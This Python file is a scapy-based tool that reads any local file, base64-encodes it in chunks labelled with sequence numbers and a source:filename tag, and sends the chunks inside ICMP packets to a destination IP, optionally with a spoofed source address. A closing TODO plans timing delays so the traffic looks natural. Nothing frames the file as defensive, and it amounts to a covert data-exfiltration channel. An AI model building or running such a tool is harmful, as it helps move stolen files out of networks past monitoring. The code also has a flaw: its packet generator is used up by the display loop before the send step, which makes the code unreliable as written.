from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import send
from typing import List, Optional
import base64
import os.path
import argparse
import io

ICMP_PACKET = {
    "IP_HEADER_SIZE": 20,
    "ICMP_HEADER_SIZE": 8,
    "MAX_ICMP_PAYLOAD_SIZE": 1472
}


def read_and_fragment_file(filename: str):
    if os.path.isfile(filename):
        with open(filename, "rb") as f:
            while True:
                chunk = f.read(io.DEFAULT_BUFFER_SIZE // 16)
                if not chunk:
                    break
                yield chunk
    else:
        raise SystemExit


def get_base64_encoded_chunks(chunks):
    for chunk in chunks:
        yield base64.b64encode(chunk)


def get_base64_encoded_file_identifier(filename: str, source: str):
    return base64.b64encode((":".join([source, filename]).encode("ascii")))


def get_base64_encoded_size_in_bytes(encoded: str):
    return int(len(encoded) * 3 / 4) - str(encoded).count('=')


def get_chunk_with_overhead(encoded_chunk: str, sequence_number: int, encoded_id: str):
    return str(encoded_chunk, "utf-8") + ':' + "%04d" % sequence_number + ':' + str(encoded_id, "utf-8")


def construct_icmp_packet(data: str, destination: str, source: Optional[str] = None) -> IP:
    return IP(dst=destination) / ICMP() / data if not source else IP(src=source, dst=destination) / ICMP() / data


def create_icmp_buffer(data, destination: str, **kwargs) -> list:
    buffer = []
    source = kwargs.get('source')
    for chunk in data:
        yield construct_icmp_packet(data=chunk, destination=destination, source=source)


def send_icmp_packets(buffer: List[IP]):
    for packet in buffer:
        send(packet)


def show_packet_details(packet: IP):
    packet.show()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--source", help="Source IPv4 address", default='127.0.0.1', type=str)
    parser.add_argument("-d", "--destination", help="Destination IPv4 address", type=str)
    parser.add_argument("-f", "--filename", help="Filename to send", type=str)
    args = parser.parse_args()

    chunks = read_and_fragment_file(filename=args.filename)
    encoded_chunks = get_base64_encoded_chunks(chunks=chunks)
    encoded_file_identifier = get_base64_encoded_file_identifier(filename=args.filename, source=args.source)

    data_to_send = []
    for sequence_number, encoded_chunk in enumerate(encoded_chunks):
        data_to_send.append(get_chunk_with_overhead(encoded_chunk=encoded_chunk, sequence_number=sequence_number,
                                                    encoded_id=encoded_file_identifier))

    buffer = create_icmp_buffer(data_to_send, destination=args.destination, source=args.source)

    for packet in buffer:
        show_packet_details(packet)

    send_icmp_packets(buffer)


if __name__ == '__main__':
    main()

# TODO: Introduce Asyncio and natural time delay in ICMP packet arrival.
